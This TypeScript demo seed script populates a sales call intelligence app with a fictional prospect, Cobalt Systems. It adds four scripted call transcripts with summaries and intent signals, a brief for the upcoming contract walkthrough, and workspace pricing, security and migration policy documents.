/**
 * One company, five calls, seven weeks.
 *
 * The point of this demo is the *arc*. A single call is easy to summarise; what
 * is hard, and what this product is for, is the fourth call remembering what
 * was promised on the second. So the transcripts below deliberately carry
 * threads forward: a migration fear raised in July is still shaping the
 * commercial conversation in August, and an SSO question asked on call two is
 * answered on call three and relied on by call five.
 *
 * It also seeds workspace documents — the seller's own pricing, security and
 * migration material. Those belong to the workspace rather than to Cobalt, so
 * they answer questions no call ever covered. Ask "who approves a discount
 * above fifty seats" and the answer comes from there, not from any transcript;
 * that is the workspace layer being visible.
 *
 *   npm run demo
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import { and, eq } from "drizzle-orm";

import { db, sqlClient } from "@/db";
import {
  accounts,
  contacts,
  followupProposals,
  meetingBriefs,
  meetingSummaries,
  meetings,
  transcripts,
  usage,
  users,
  workspaceDocuments,
  workspaces,
  type IntentSignals,
  type MeetingAttendee,
  type SpeakerSegment,
} from "@/db/schema";
import { indexDocument } from "@/lib/retrieval";

const REP_EMAIL = process.env.DEMO_REP_EMAIL ?? "rep@northstar.io";
const REP_NAME = "Sam Okonkwo";

/** Days from today at a fixed hour, so the demo reads the same whenever it runs. */
function daysAgo(days: number, hour: number, minute = 0): Date {
  const d = new Date();
  d.setDate(d.getDate() - days);
  d.setHours(hour, minute, 0, 0);
  return d;
}

const EXTERNALS = {
  priya: { email: "priya@cobaltsystems.com", displayName: "Priya Raman", external: true },
  dana: { email: "dana@cobaltsystems.com", displayName: "Dana Whitfield", external: true },
  marcus: { email: "marcus@cobaltsystems.com", displayName: "Marcus Webb", external: true },
  tom: { email: "treyes@cobaltsystems.com", displayName: "Tom Reyes", external: true },
};
const SELF = { email: REP_EMAIL, displayName: REP_NAME, self: true, organizer: true, external: false };

// ---------------------------------------------------------------------------
// The five calls
// ---------------------------------------------------------------------------

type Call = {
  key: string;
  title: string;
  daysAgo: number;
  hour: number;
  durationMin: number;
  attendees: MeetingAttendee[];
  turns: [string, string][];
  intent: IntentSignals;
  summary: string;
};

const CALL_1: Call = {
  key: "discovery",
  title: "Cobalt Systems — discovery",
  daysAgo: 45,
  hour: 14,
  durationMin: 40,
  attendees: [SELF, EXTERNALS.priya, EXTERNALS.dana],
  turns: [
    ["Priya Raman", "Thanks for making time. I should say up front we're early — we've shortlisted three vendors and you're one of them."],
    [REP_NAME, "That's useful to know. What's driving the replacement in the first place?"],
    ["Priya Raman", "The system we're on is seven years old. It was built for a company half our size and we've outgrown it. Reporting takes days when it should take minutes."],
    ["Dana Whitfield", "The honest version is that half my team has quietly stopped using it. They keep their own spreadsheets, which is worse than having no system at all."],
    [REP_NAME, "How many people would be on the new one?"],
    ["Dana Whitfield", "Around a hundred and twenty across sales and customer success. Maybe a few more by next year."],
    [REP_NAME, "And what does the decision look like internally — who else needs to be comfortable?"],
    ["Priya Raman", "Marcus in finance, and security will have a view. I own the evaluation but I don't sign."],
    ["Dana Whitfield", "There's something you should know before we go further. We did this three years ago with a different vendor. They quoted eight weeks for the migration and it took nine months."],
    [REP_NAME, "That's a long time to be running two systems."],
    ["Dana Whitfield", "It was. We lost a quarter of reporting history in the middle of it. So when someone shows me a migration timeline now, I don't really believe it."],
    [REP_NAME, "I'd rather not argue with that, because I can't prove a timeline in a first call. What I can do is take the deadline out of it — we run the migration in parallel. Your existing system stays live and authoritative until you decide to cut over. There's no date where something switches off."],
    ["Dana Whitfield", "That's a different shape of risk. If it drags, we're just running two systems, we're not broken."],
    ["Priya Raman", "Can you put the parallel-run approach in writing? Marcus will ask, and I'd rather hand him a document than a summary of a call."],
    [REP_NAME, "Yes. I'll send a migration outline this week with that in it."],
    ["Priya Raman", "Then the next thing is probably a technical session. Dana's team will want to go deeper than I can."],
    [REP_NAME, "Happy to. Anything they should know to prepare?"],
    ["Dana Whitfield", "Tell them to expect questions about how it fits what we already run. That's usually where these fall down."],
  ],
  intent: {
    buyingInterest: "medium",
    interestRationale:
      "A real, specific pain and a named seat count, but no budget confirmed and no date they are working backwards from yet. Early rather than warm.",
    objections: [
      {
        objection: "Deep scepticism about migration timelines after a previous vendor overran by seven months and lost reporting history.",
        severity: "high",
        quote: "They quoted eight weeks for the migration and it took nine months.",
      },
      {
        objection: "Current tool has already lost internal adoption, so the team is wary of another rollout.",
        severity: "medium",
        quote: "half my team has quietly stopped using it",
      },
    ],
    nextSteps: [
      { step: "Send the migration outline covering the parallel-run approach", owner: "us", dueDate: null },
      { step: "Schedule a technical session with Dana's team", owner: "us", dueDate: null },
    ],
    competitorsMentioned: ["Two other shortlisted vendors, unnamed"],
    budgetSignals: [],
    timelineSignals: ["No date named; evaluation described as early"],
    followupRecommended: true,
    followupRationale: "A technical session was agreed in principle but not scheduled, and a document was promised.",
    suggestedFollowupDays: 10,
  },
  summary: `**The short version**

Cobalt Systems is replacing a seven-year-old system that has already lost internal adoption. We are one of three shortlisted vendors. About 120 seats. No budget or date confirmed yet — this is genuinely early.

**What they told us**

The pain is concrete rather than aspirational: reporting takes days, and Dana admitted half her team has abandoned the tool for private spreadsheets. That is a stronger buying signal than enthusiasm would be, because the cost of doing nothing is already being paid.

The important disclosure came late. Three years ago a different vendor quoted eight weeks for a migration and took nine months, and Cobalt lost a quarter of reporting history in the process. Dana said plainly that she no longer believes migration timelines. This is the central obstacle in the deal and it is emotional as much as commercial.

**What we told them**

Rather than defending a timeline, Sam removed the deadline from the equation: a parallel run where the existing system stays authoritative until Cobalt chooses to cut over. Dana's response — "that's a different shape of risk" — suggests it landed. Priya asked for it in writing, which is what a champion does when they intend to argue your case internally.

**Where it stands**

Promising but unqualified. We have a named champion, a seat count, and a real pain. We do not have budget, a date, or the economic buyer in a room. Those are the next three things to establish.

**Next steps**

- Send the migration outline with the parallel-run detail — ours, this week
- Get a technical session scheduled with Dana's team — ours`,
};

const CALL_2: Call = {
  key: "technical",
  title: "Cobalt Systems — technical deep-dive",
  daysAgo: 31,
  hour: 11,
  durationMin: 55,
  attendees: [SELF, EXTERNALS.dana, EXTERNALS.tom],
  turns: [
    ["Dana Whitfield", "I've got Tom with me — he handles anything that touches identity or infrastructure."],
    [REP_NAME, "Good, those are usually the questions I can't answer well on a first call."],
    ["Tom Reyes", "Let's start with the obvious one. How do people sign in?"],
    [REP_NAME, "Today it's email and password, or Google. There's a proper enterprise identity path but I want to be careful about what I promise on it."],
    ["Tom Reyes", "Meaning what, specifically? We run Okta. Everything we buy has to sit behind it."],
    ["Dana Whitfield", "This is a hard requirement, not a preference. We had an audit finding last year about applications outside SSO."],
    [REP_NAME, "Then let me check rather than guess. SAML SSO is on the roadmap and I believe it's close, but I don't want to tell you a quarter and be wrong — you've had enough of that."],
    ["Dana Whitfield", "Appreciated. But we do need an answer before this goes anywhere."],
    [REP_NAME, "You'll have one this week. I'll confirm the quarter and whether it's included at your tier or priced separately."],
    ["Tom Reyes", "Second question. Where does the data live?"],
    [REP_NAME, "Single region, and you choose it. Nothing crosses regions for processing."],
    ["Tom Reyes", "And the migration — Dana mentioned you'd run it in parallel. What does that actually mean in practice for us?"],
    [REP_NAME, "Your existing system stays the source of truth. We sync into ours read-only, you validate against reports you already trust, and only when you're satisfied do you flip the direction. If you never flip it, you've lost nothing but the sync."],
    ["Dana Whitfield", "That's the part I wanted Tom to hear."],
    ["Tom Reyes", "It's more reasonable than what we did last time. What's the integration surface? We've got a warehouse and we're not moving off it."],
    [REP_NAME, "There's an API and a warehouse export. What are you running?"],
    ["Tom Reyes", "Snowflake."],
    [REP_NAME, "That's supported directly. I'll include the connector detail in what I send."],
    ["Dana Whitfield", "So the open item is SSO, and everything else is answerable."],
    [REP_NAME, "That's my read too. SSO this week, and I'll assume you want the security documentation at the same time."],
    ["Tom Reyes", "Yes. And whatever you have on penetration testing."],
  ],
  intent: {
    buyingInterest: "medium",
    interestRationale:
      "They brought their infrastructure owner and asked implementation questions rather than evaluation questions, which means they are modelling what it looks like to actually run this. But a hard requirement is unresolved.",
    objections: [
      {
        objection: "SAML SSO is a hard requirement tied to a prior audit finding, and we could not confirm availability on the call.",
        severity: "high",
        quote: "This is a hard requirement, not a preference.",
      },
      {
        objection: "Will not move off their existing Snowflake warehouse.",
        severity: "low",
        quote: "We've got a warehouse and we're not moving off it.",
      },
    ],
    nextSteps: [
      { step: "Confirm which quarter SAML SSO ships and whether it is included at their tier", owner: "us", dueDate: null },
      { step: "Send security documentation including penetration test results", owner: "us", dueDate: null },
      { step: "Include Snowflake connector detail", owner: "us", dueDate: null },
    ],
    competitorsMentioned: [],
    budgetSignals: [],
    timelineSignals: ["SSO answer needed 'before this goes anywhere'"],
    followupRecommended: true,
    followupRationale:
      "A hard requirement was left open with a commitment to answer within the week. That answer is the gate on everything else.",
    suggestedFollowupDays: 7,
  },
  summary: `**The short version**

A technical session that went well on everything except the one thing that matters most. SSO is a hard requirement tied to an audit finding, and we could not confirm it on the call. Everything else — data residency, migration mechanics, Snowflake — was answerable.

**What they told us**

Tom Reyes runs identity and infrastructure and asked the questions you would expect: sign-in, data location, integration surface. Dana escalated the SSO point deliberately, framing it as a hard requirement rather than a preference and tying it to an audit finding about applications sitting outside SSO. That framing means it cannot be traded away later.

They confirmed Snowflake and said they are not moving off it, which is fine — the connector is supported.

**What we told them**

Sam declined to guess a shipping quarter for SAML SSO, which was the right call given this account's history with vendor timelines, and committed to a definitive answer within the week including whether it is included at their tier.

The parallel-run migration was explained properly for the first time, to the person who will have to operate it. Tom's response — that it was more reasonable than their last experience — is the first sign the migration objection is losing force.

**Where it stands**

The deal now has a single named gate. Answer SSO and this progresses; leave it open and nothing else moves.

**Next steps**

- Confirm the SSO quarter and tier inclusion — ours, this week
- Send security documentation and penetration test results — ours
- Include the Snowflake connector detail — ours`,
};

const CALL_3: Call = {
  key: "security",
  title: "Cobalt Systems — security review kickoff",
  daysAgo: 17,
  hour: 15,
  durationMin: 35,
  attendees: [SELF, EXTERNALS.tom, EXTERNALS.marcus, EXTERNALS.priya],
  turns: [
    ["Priya Raman", "Marcus is joining for the first time, so a quick reset — we've done discovery and a technical session, and the open item was SSO."],
    [REP_NAME, "Which I can now close. SAML SSO ships in Q4, and it's included at your tier — there's no separate line for it."],
    ["Dana Whitfield", "Q4 works. That's before our renewal on the old system."],
    ["Tom Reyes", "Included is the part I care about. Last vendor wanted twelve thousand a year for it."],
    ["Marcus Webb", "Right, then let me get to what I need. We can't sign anything without a current SOC 2 Type II report."],
    [REP_NAME, "We have Type II, renewed in March. I can share it under NDA today."],
    ["Marcus Webb", "Today would be good. Our last audit flagged vendor management, so this is the gate for me — not a preference."],
    [REP_NAME, "Understood. What happens after you have it?"],
    ["Marcus Webb", "Security review, which realistically takes two weeks. Then it goes to the board, and they meet on the twelfth of next month."],
    ["Priya Raman", "If we miss the twelfth it's another month, and at that point we're renewing the old system for a year."],
    [REP_NAME, "Then let's work backwards. If the review starts this week you clear it with a week to spare."],
    ["Marcus Webb", "That's my thinking. Tom, can you start Thursday?"],
    ["Tom Reyes", "If the documentation is in by Wednesday, yes."],
    [REP_NAME, "It will be. Report, penetration test summary, and the data residency detail in one package."],
    ["Marcus Webb", "One more thing, and I'd rather raise it now than at the end. The per-seat model is going to be a conversation. A hundred and twenty seats at list is more than we've spent on any single tool."],
    [REP_NAME, "I'd rather have that conversation properly than in passing. Can we book it separately?"],
    ["Marcus Webb", "Yes. Let's do commercials once security is underway."],
  ],
  intent: {
    buyingInterest: "high",
    interestRationale:
      "The economic buyer joined, named a firm gate, volunteered their internal approval sequence and a hard board date unprompted, and pre-flagged the commercial conversation. That is a buyer planning the purchase, not evaluating it.",
    objections: [
      {
        objection: "Cannot sign without a current SOC 2 Type II report; their last audit flagged vendor management.",
        severity: "high",
        quote: "We can't sign anything without a current SOC 2 Type II report.",
      },
      {
        objection: "Per-seat pricing at 120 seats exceeds anything they have spent on a single tool.",
        severity: "medium",
        quote: "A hundred and twenty seats at list is more than we've spent on any single tool.",
      },
    ],
    nextSteps: [
      { step: "Send the SOC 2 Type II report under NDA", owner: "us", dueDate: null },
      { step: "Deliver the full security package by Wednesday", owner: "us", dueDate: null },
      { step: "Start the two-week security review Thursday", owner: "them", dueDate: null },
      { step: "Book a separate commercial conversation", owner: "us", dueDate: null },
    ],
    competitorsMentioned: ["Previous vendor charged $12k/year for SSO"],
    budgetSignals: ["120 seats at list described as more than any single tool they have bought"],
    timelineSignals: [
      "Board meets on the twelfth of next month",
      "Security review takes two weeks and starts Thursday",
      "Missing the board date means renewing the incumbent for a year",
    ],
    followupRecommended: true,
    followupRationale:
      "The commercial conversation was explicitly deferred to a separate session and the board date is fixed. That session has to happen while security is running, not after.",
    suggestedFollowupDays: 7,
  },
  summary: `**The short version**

The deal qualified itself on this call. Marcus — the economic buyer — joined, named his gate, and volunteered the whole approval sequence including a hard board date on the twelfth. SSO was closed as an open item. Pricing was pre-flagged as the next obstacle.

**What they told us**

Marcus will not sign without a current SOC 2 Type II report, and framed it as a gate rather than a preference because their last audit flagged vendor management. His sequence: report today, security review starting Thursday and running two weeks, board on the twelfth of next month.

Priya made the consequence explicit — miss the twelfth and Cobalt renews the incumbent for a year. That is the real deadline in this deal.

Marcus then did something unusually cooperative: he raised the per-seat objection early and asked to handle it in a dedicated session rather than letting it surface at signature.

**What we told them**

Sam closed the SSO thread from the previous call: Q4, included at their tier, no separate line. Tom's reaction — that their last vendor charged twelve thousand a year for the same thing — turned a requirement into a differentiator.

The SOC 2 report was offered same-day under NDA, with the full package by Wednesday to protect the Thursday start.

**Where it stands**

Strong, and now genuinely qualified: named economic buyer, written security path, a date they are working backwards from, and confirmed budget intent. The remaining risk is commercial, not technical.

**Next steps**

- Send the SOC 2 Type II report under NDA — ours, today
- Full security package by Wednesday — ours
- Security review starts Thursday — theirs
- Book the commercial conversation — ours`,
};

const CALL_4: Call = {
  key: "commercials",
  title: "Cobalt Systems — commercials",
  daysAgo: 4,
  hour: 10,
  durationMin: 45,
  attendees: [SELF, EXTERNALS.marcus, EXTERNALS.priya],
  turns: [
    [REP_NAME, "Before pricing — how's the security review going?"],
    ["Marcus Webb", "Cleared on Tuesday. Tom had two questions and both were answered in the documentation."],
    ["Priya Raman", "Which is the first time one of these has gone through without a fight."],
    [REP_NAME, "Good. Then the board on the twelfth is still live."],
    ["Marcus Webb", "It is, and that's why I want the number settled now. A hundred and twenty seats at list is a hundred and eight thousand a year. I can't take that in without something."],
    [REP_NAME, "Let me be straight about how this works on our side. Anything above fifty seats, the discount isn't mine to give — it goes to our VP of Sales. So I can't agree a number in this call, but I can tell you what I'll ask for and what I think lands."],
    ["Marcus Webb", "That's more useful than a number you'd walk back."],
    [REP_NAME, "What would make this straightforward for you?"],
    ["Marcus Webb", "Two years instead of one, if the price reflects it. I'd rather lock a rate than renegotiate next year."],
    [REP_NAME, "A two-year term is exactly the case I can make well. What I'd take to the VP is a rate held flat for both years, with the second year not repriced on seat growth up to a threshold."],
    ["Priya Raman", "Seat growth is the bit that worries me. We're at a hundred and twenty now but Dana's team is hiring."],
    [REP_NAME, "Then that's worth more to you than a headline discount. If the second year reprices, a big discount today just moves the problem."],
    ["Marcus Webb", "Agreed. Get me a two-year number with the growth threshold and I'll put it in front of the board."],
    [REP_NAME, "When do you need it?"],
    ["Marcus Webb", "The board pack goes out three days before, so I need it by the ninth."],
    ["Priya Raman", "And can you do a walkthrough of the contract before then? Dana and Tom should see the migration commitments written down, not just described."],
    [REP_NAME, "Yes. I'd suggest we do that with everyone in the room."],
    ["Marcus Webb", "Do it early next week. If the paper matches the calls, this is done."],
  ],
  intent: {
    buyingInterest: "high",
    interestRationale:
      "Security cleared, the board date holds, and the buyer is now negotiating structure rather than deciding whether to buy. They asked for a number to put in a board pack with a named deadline.",
    objections: [
      {
        objection: "120 seats at list is $108k/year and cannot go to the board without a concession.",
        severity: "high",
        quote: "I can't take that in without something.",
      },
      {
        objection: "Concerned that seat growth will reprice year two and erode any first-year discount.",
        severity: "medium",
        quote: "We're at a hundred and twenty now but Dana's team is hiring.",
      },
    ],
    nextSteps: [
      { step: "Take the two-year proposal to the VP of Sales for discount approval", owner: "us", dueDate: null },
      { step: "Send a two-year number with a seat-growth threshold by the ninth", owner: "us", dueDate: null },
      { step: "Run a contract walkthrough with Dana and Tom early next week", owner: "us", dueDate: null },
    ],
    competitorsMentioned: [],
    budgetSignals: ["$108k/year at list for 120 seats", "Prefers a two-year term at a held rate"],
    timelineSignals: ["Board pack goes out three days before the twelfth — number needed by the ninth"],
    followupRecommended: true,
    followupRationale:
      "The customer asked for the contract walkthrough directly and set a hard date for the number. Both sit inside the next week.",
    suggestedFollowupDays: 4,
  },
  summary: `**The short version**

Security cleared on Tuesday without a fight. The board date on the twelfth holds. The conversation has moved from whether to buy to how the paper is structured — and the customer asked for the closing meeting themselves.

**What they told us**

Marcus put the commercial problem plainly: 120 seats at list is $108k a year and he cannot take that to a board without a concession. But what he actually wants is not a discount — it is predictability. He asked for a two-year term at a held rate, and Priya sharpened it: Dana's team is hiring, so repricing on seat growth in year two would undo any first-year saving.

He needs the number by the ninth because the board pack goes out three days ahead.

Priya asked for a contract walkthrough with Dana and Tom present, so they can see the migration commitments written down rather than described. That request traces directly back to the first call and the nine-month overrun.

**What we told them**

Sam was explicit about the internal constraint rather than implying authority he does not have: above fifty seats, the discount belongs to the VP of Sales. He committed to what he would ask for instead of a number he might walk back, and steered the concession toward a seat-growth threshold — worth more to this customer than a headline discount.

**Where it stands**

Late-stage and healthy. Every gate this deal had — migration trust, SSO, SOC 2 — is now closed. What remains is one approval on our side and one meeting.

**Next steps**

- Take the two-year proposal to the VP of Sales — ours
- Send the two-year number with the seat-growth threshold by the ninth — ours
- Contract walkthrough with Dana and Tom early next week — ours`,
};

const CALLS = [CALL_1, CALL_2, CALL_3, CALL_4];

// ---------------------------------------------------------------------------
// The upcoming call, and the brief that draws on all four
// ---------------------------------------------------------------------------

const UPCOMING_BRIEF = `**Where this stands**

Fifth call, and the last one before the board meets on the twelfth. Cobalt has cleared security, closed every technical gate, and asked for this meeting themselves. Marcus's words on the last call were that if the paper matches the calls, this is done.

**Who is in the room**

- **Priya Raman**, Director of Platform Operations — owns the evaluation, has argued your case internally since July. She asked for this walkthrough.
- **Marcus Webb**, Finance — the economic buyer and the only signature that matters. Joined at call three and has been decisive since.
- **Dana Whitfield**, VP Engineering — carries the scar tissue from the previous migration. She is the person the written commitments are for.
- **Tom Reyes**, Security and Infrastructure — cleared the review on Tuesday. Likely quiet unless something in the paper contradicts the documentation.

**What you have promised, and where**

- **Parallel-run migration** — offered on the discovery call on ${daysAgo(45, 14).toLocaleDateString("en-GB", { day: "numeric", month: "long" })} and explained in mechanical detail to Tom on the technical call. Dana has not yet seen it in writing. This is the single thing she is coming to check.
- **SAML SSO in Q4, included at their tier** — confirmed on the security call. Tom noted their previous vendor charged $12k a year for the same thing. Do not let this become a footnote in the contract.
- **Snowflake connector support** — confirmed on the technical call.
- **A two-year number with a seat-growth threshold, by the ninth** — promised on the commercials call. If VP approval has not come back, say so at the start rather than at the end.

**The one thing to get right**

Dana's objection was never really about migration mechanics — it is that a vendor told her something and the document said something else. Every commitment above needs to be findable in the paper in front of her. If one of them is missing, name it before she does.

**What is likely to come up**

- Whether the second-year rate is genuinely held, and what the seat threshold actually is.
- Whether the SSO commitment is contractual or a roadmap statement.
- What happens if the parallel run runs long — Dana will want to know there is no clause that ends it.

**Open from the last call**

The discount approval sits with the VP of Sales and was not resolved when you last spoke. The board pack goes out on the ninth.`;

const WORKSPACE_DOCS = [
  {
    title: "Pricing and discount policy",
    kind: "pricing" as const,
    content: `Northstar is priced per seat on annual contracts. List is $75 per seat per month, billed annually.

Discount authority. A rep may approve up to 10% without escalation. Anything above 50 seats, or any discount above 10%, is approved by the VP of Sales — never by the rep on the call. Discounts above 25% additionally require the CFO and are rarely granted outside a multi-year term.

Multi-year terms. Two- and three-year terms are the preferred concession because they cost margin once rather than annually. A two-year term at a held rate is normally approvable where a same-size one-year discount would not be.

Seat growth. Standard contracts reprice on seat count at renewal. A growth threshold — where seats may rise by an agreed percentage before repricing — is a strong concession for a growing team and is usually cheaper for us than the equivalent headline discount. Offer it before offering a larger percentage off.

Never quote a number in a call that requires approval you do not have. Say what you will ask for.`,
  },
  {
    title: "Security and compliance",
    kind: "objection" as const,
    content: `SOC 2 Type II. Current, renewed each March. Shareable under NDA and may be sent the same day it is requested. This is the single most common gate in enterprise deals and there is no reason to delay it.

Penetration testing. Conducted annually by an external firm. A summary report is shareable under NDA; the full report is not.

Data residency. Single region, selected by the customer. No cross-region processing.

SAML SSO. Ships Q4. Included at Growth tier and above at no additional charge — this is a genuine differentiator, as several competitors charge separately for it.

Encryption. AES-256 at rest, TLS 1.3 in transit.

Subprocessors. Listed publicly and updated with 30 days notice before any addition.`,
  },
  {
    title: "Migration and onboarding",
    kind: "product" as const,
    content: `Every migration is offered as a parallel run. The customer's existing system stays the source of truth. We sync into Northstar read-only, the customer validates against reports they already trust, and only when they are satisfied does the direction flip. If they never flip it, they have lost nothing but the sync.

This exists because migration risk, not product fit, is what kills enterprise deals. Never argue with a bad migration experience — acknowledge it and remove the deadline structurally.

Typical duration is three weeks for a standard dataset, scoped by the onboarding team. Duration is not a commitment; the parallel run is. Put the parallel-run commitment in writing the same week it is raised, and make sure it appears in the contract rather than only in email.

Warehouse integration. Direct connectors for Snowflake, BigQuery and Redshift. A generic export exists for anything else.`,
  },
  {
    title: "What we qualify on",
    kind: "positioning" as const,
    content: `A deal is not forecast until four things are established:

1. A named economic buyer who has been in a room with us, not described to us.
2. A written security path — we know what their review requires and when it starts.
3. A date the customer is working backwards from, in their words rather than ours.
4. Confirmation that budget exists in this fiscal period rather than the next one.

Where we win. Against incumbents, on reporting speed and adoption — most losses to us are tools people quietly stopped using. Against newer vendors, on the security posture and the parallel-run migration, which smaller competitors cannot underwrite.

Where we lose. Deals where the champion never gets finance into a room, and deals where SSO was needed before Q4.`,
  },
];

// ---------------------------------------------------------------------------

async function main() {
  console.log("Building the demo account…\n");

  // When pointed at a real signed-in user, attach to whoever they already are.
  // Creating or renaming their workspace would rewrite live identity to stage a
  // demo, and deleting by owner would take their real accounts with it.
  const existing = await db.query.users.findFirst({ where: eq(users.email, REP_EMAIL) });

  let workspaceId = existing?.workspaceId ?? null;
  if (!workspaceId) {
    const [created] = await db
      .insert(workspaces)
      .values({
        name: "Northstar",
        domain: "northstar.io",
        description:
          "Northstar sells a revenue-intelligence platform to mid-market sales teams. Priced per seat on annual contracts, with a security review typically required above 50 seats.",
      })
      .onConflictDoUpdate({ target: workspaces.domain, set: { updatedAt: new Date() } })
      .returning();
    workspaceId = created.id;
  }

  const [rep] = existing
    ? [existing]
    : await db
        .insert(users)
        .values({
          email: REP_EMAIL,
          workspaceId,
          name: REP_NAME,
          emailDomain: REP_EMAIL.split("@")[1],
          defaultDeliverableType: "plain_summary",
        })
        .returning();

  if (!existing) {
    console.log(`  rep            ${rep.email} (created)`);
  } else {
    console.log(`  rep            ${rep.email} (existing — leaving their data alone)`);
  }

  // Idempotent, but only over what this script owns: the demo account and the
  // demo's own workspace documents. Never a blanket delete by owner.
  await db
    .delete(accounts)
    .where(and(eq(accounts.ownerUserId, rep.id), eq(accounts.domain, "cobaltsystems.com")));
  for (const doc of WORKSPACE_DOCS) {
    await db
      .delete(workspaceDocuments)
      .where(and(eq(workspaceDocuments.workspaceId, workspaceId), eq(workspaceDocuments.title, doc.title)));
  }

  const [cobalt] = await db
    .insert(accounts)
    .values({
      ownerUserId: rep.id,
      workspaceId,
      companyName: "Cobalt Systems",
      domain: "cobaltsystems.com",
      industry: "Manufacturing software",
      dealStage: "negotiation",
    })
    .returning();

  await db.insert(contacts).values([
    {
      accountId: cobalt.id,
      name: "Priya Raman",
      role: "Director of Platform Operations",
      email: EXTERNALS.priya.email,
      isDecisionMaker: true,
    },
    {
      accountId: cobalt.id,
      name: "Marcus Webb",
      role: "Finance — economic buyer",
      email: EXTERNALS.marcus.email,
      isDecisionMaker: true,
    },
    {
      accountId: cobalt.id,
      name: "Dana Whitfield",
      role: "VP Engineering",
      email: EXTERNALS.dana.email,
      isDecisionMaker: false,
    },
    {
      accountId: cobalt.id,
      name: "Tom Reyes",
      role: "Security and Infrastructure",
      email: EXTERNALS.tom.email,
      isDecisionMaker: false,
    },
  ]);

  await db
    .insert(usage)
    .values({ userId: rep.id, meetingsProcessedThisMonth: 4, freeTierLimit: 5 })
    .onConflictDoNothing();

  // --- The workspace's own material, which belongs to no single account ----
  let chunks = 0;
  for (const doc of WORKSPACE_DOCS) {
    const [row] = await db
      .insert(workspaceDocuments)
      .values({ workspaceId, title: doc.title, content: doc.content, kind: doc.kind })
      .returning();
    chunks += await indexDocument({
      workspaceId,
      accountId: null,
      sourceType: "workspace_doc",
      sourceId: row.id,
      content: `${row.title}\n\n${row.content}`,
      meta: { kind: row.kind, label: row.title },
    });
    console.log(`  workspace doc  ${doc.title}`);
  }

  // --- The four completed calls -------------------------------------------
  for (const call of CALLS) {
    const scheduledAt = daysAgo(call.daysAgo, call.hour);
    const endsAt = new Date(scheduledAt.getTime() + call.durationMin * 60_000);

    const [meeting] = await db
      .insert(meetings)
      .values({
        accountId: cobalt.id,
        ownerUserId: rep.id,
        title: call.title,
        scheduledAt,
        endsAt,
        calendarEventId: `demo-cobalt-${call.key}`,
        meetingUrl: `https://meet.google.com/demo-cobalt-${call.key}`,
        status: "processed",
        attendees: call.attendees,
      })
      .returning();

    const segments: SpeakerSegment[] = call.turns.map(([speaker, text], i) => ({
      speakerName: speaker,
      speakerUuid: null,
      speakerIsHost: speaker === REP_NAME,
      timestampMs: i * 82_000,
      durationMs: 15_000,
      text,
    }));
    const rawText = segments.map((s) => `${s.speakerName}: ${s.text}`).join("\n");
    const day = scheduledAt.toISOString().slice(0, 10);

    const [transcript] = await db
      .insert(transcripts)
      .values({
        meetingId: meeting.id,
        rawText,
        speakerSegments: segments,
        source: "seed",
        durationSeconds: call.durationMin * 60,
      })
      .returning();

    const [summary] = await db
      .insert(meetingSummaries)
      .values({
        meetingId: meeting.id,
        content: call.summary,
        intentSignals: call.intent,
        deliverableType: "plain_summary",
      })
      .returning();

    chunks += await indexDocument({
      workspaceId,
      accountId: cobalt.id,
      sourceType: "transcript",
      sourceId: transcript.id,
      content: rawText,
      meta: { meetingId: meeting.id, meetingTitle: call.title, scheduledAt: scheduledAt.toISOString(), label: `Transcript — ${day}` },
    });
    chunks += await indexDocument({
      workspaceId,
      accountId: cobalt.id,
      sourceType: "summary",
      sourceId: summary.id,
      content: call.summary,
      meta: { meetingId: meeting.id, meetingTitle: call.title, scheduledAt: scheduledAt.toISOString(), label: `Summary — ${day}` },
    });

    console.log(`  call           ${call.title}  (${call.daysAgo}d ago)`);
  }

  // --- The upcoming call, with a brief built on all four ------------------
  const upcomingAt = new Date();
  upcomingAt.setDate(upcomingAt.getDate() + 1);
  upcomingAt.setHours(10, 30, 0, 0);
  const upcomingEnd = new Date(upcomingAt.getTime() + 45 * 60_000);

  const [upcoming] = await db
    .insert(meetings)
    .values({
      accountId: cobalt.id,
      ownerUserId: rep.id,
      title: "Cobalt Systems — contract walkthrough",
      scheduledAt: upcomingAt,
      endsAt: upcomingEnd,
      calendarEventId: "demo-cobalt-walkthrough",
      meetingUrl: "https://meet.google.com/demo-cobalt-walkthrough",
      status: "brief_ready",
      botId: "bot_demoCobalt",
      botState: "scheduled",
      attendees: [SELF, EXTERNALS.priya, EXTERNALS.marcus, EXTERNALS.dana, EXTERNALS.tom],
    })
    .returning();

  const [brief] = await db
    .insert(meetingBriefs)
    .values({
      meetingId: upcoming.id,
      content: UPCOMING_BRIEF,
      citations: [
        { title: "Cobalt Systems — Newsroom", url: "https://www.cobaltsystems.com/news" },
        { title: "Cobalt Systems — Leadership", url: "https://www.cobaltsystems.com/about/leadership" },
      ],
      notifiedAt: new Date(),
    })
    .returning();

  chunks += await indexDocument({
    workspaceId,
    accountId: cobalt.id,
    sourceType: "brief",
    sourceId: brief.id,
    content: UPCOMING_BRIEF,
    meta: {
      meetingId: upcoming.id,
      meetingTitle: upcoming.title,
      scheduledAt: upcomingAt.toISOString(),
      label: `Brief — ${upcomingAt.toISOString().slice(0, 10)}`,
    },
  });
  console.log(`  upcoming       ${upcoming.title}  (tomorrow, brief ready)`);

  await db.insert(followupProposals).values({
    meetingId: upcoming.id,
    accountId: cobalt.id,
    title: "Cobalt — send the two-year number before the board pack",
    agenda: `- Confirm the VP-approved two-year rate and the seat-growth threshold\n- Walk through the migration commitments as written in the contract\n- Confirm the SSO commitment is contractual rather than roadmap\n- Agree what goes into the board pack on the ninth`,
    rationale:
      "The board pack goes out on the ninth and the number has to be in it. Everything else in this deal is closed, so this is the only remaining path to the twelfth.",
    proposedStart: (() => {
      const d = new Date();
      d.setDate(d.getDate() + 3);
      d.setHours(9, 0, 0, 0);
      return d;
    })(),
    proposedEnd: (() => {
      const d = new Date();
      d.setDate(d.getDate() + 3);
      d.setHours(9, 30, 0, 0);
      return d;
    })(),
    attendeeEmails: [REP_EMAIL, EXTERNALS.marcus.email, EXTERNALS.priya.email],
    status: "pending",
  });

  console.log(`\nDone. Cobalt Systems: 5 meetings, ${WORKSPACE_DOCS.length} workspace documents, ${chunks} indexed chunks.`);
  console.log(`\nThings worth asking in the chat on the Cobalt account:`);
  console.log(`  "What did we promise them about SSO?"        — spans calls two and three`);
  console.log(`  "Why is Dana difficult about migration?"     — traces back to the first call`);
  console.log(`  "Who approves a discount above fifty seats?" — workspace material, no call covers it`);
  console.log(`  "What has changed since we first spoke?"     — the whole arc`);
}

main()
  .catch((error) => {
    console.error("Demo failed:", error);
    process.exitCode = 1;
  })
